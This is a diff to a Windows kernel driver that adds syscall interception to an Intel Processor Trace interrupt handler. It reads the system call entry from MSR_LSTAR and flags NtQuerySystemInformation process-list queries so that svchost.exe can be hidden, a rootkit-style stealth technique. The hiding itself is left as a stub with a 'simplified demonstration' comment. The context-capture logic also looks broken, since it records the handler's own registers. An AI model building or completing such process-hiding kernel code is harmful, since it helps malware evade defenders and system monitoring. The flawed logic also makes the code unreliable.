@@ -4,6 +4,7 @@
 // Global PT context
 PT_HOOK_CONTEXT g_PtContext = { 0 };
 KINTERRUPT* g_PmiInterrupt = NULL;
+ULONG64 g_KiSystemCall64 = 0;
 
 // PT buffer size (64KB)
 #define PT_BUFFER_SIZE (64 * 1024)
@@ -29,6 +30,10 @@ NTSTATUS InitializePtHooking(VOID)
     // Initialize context structure
     RtlZeroMemory(&g_PtContext, sizeof(PT_HOOK_CONTEXT));
     g_PtContext.BufferSize = PT_BUFFER_SIZE;
+    
+    // Get KiSystemCall64 address from MSR_LSTAR
+    g_KiSystemCall64 = __readmsr(MSR_LSTAR);
+    KdPrint(("[+] KiSystemCall64 address: 0x%llx\n", g_KiSystemCall64));
     
     // Allocate ToPA table (must be 4KB aligned)
     g_PtContext.TopaBuffer = MmAllocateContiguousMemory(PAGE_SIZE, (PHYSICAL_ADDRESS){ .QuadPart = MAXULONG64 });
@@ -137,8 +142,52 @@ BOOLEAN PtPmiHandler(
     // Clear the status register to acknowledge the interrupt
     __writemsr(IA32_RTIT_STATUS, 0);
     
-    // TODO: Add syscall interception logic here
-    // This will be implemented in Task 3
+    // Get current processor context
+    CONTEXT context = { 0 };
+    context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
+    RtlCaptureContext(&context);
+    
+    // Check if we're in a syscall context
+    if (g_KiSystemCall64) {
+        ULONG64 rip = context.Rip;
+        ULONG64 rax = context.Rax;
+        ULONG64 rcx = context.Rcx;
+        
+        // Check if RIP is within syscall range (KiSystemCall64 ± 0x1000)
+        if (rip >= g_KiSystemCall64 && rip <= (g_KiSystemCall64 + 0x1000)) {
+            // Check if this is NtQuerySystemInformation (syscall 0x55)
+            if (rax == SYSCALL_NTQUERYSYSTEMINFORMATION) {
+                // Check if querying for process information (SystemProcessInformation = 5)
+                if (rcx == SYSTEMPROCESSINFORMATION) {
+                    // Get current process
+                    PEPROCESS currentProcess = PsGetCurrentProcess();
+                    if (currentProcess) {
+                        // Get process image name using defined offset
+                        PCHAR processName = (PCHAR)((PUCHAR)currentProcess + EPROCESS_IMAGEFILENAME_OFFSET);
+                        
+                        // Safely check process name with bounds checking
+                        __try {
+                            if (processName && strlen(processName) > 0) {
+                                // Check if process name matches "svchost.exe"
+                                if (_stricmp(processName, "svchost.exe") == 0) {
+                                    KdPrint(("[+] Hiding svchost.exe process from NtQuerySystemInformation\n"));
+                                    
+                                    // Note: In a real implementation, we would need to modify
+                                    // the system call result or manipulate the process list
+                                    // This is a simplified demonstration
+                                    
+                                    return TRUE;
+                                }
+                            }
+                        }
+                        __except (EXCEPTION_EXECUTE_HANDLER) {
+                            KdPrint(("[-] Exception accessing process name\n"));
+                        }
+                    }
+                }
+            }
+        }
+    }
     
     return TRUE; // Handled
 }
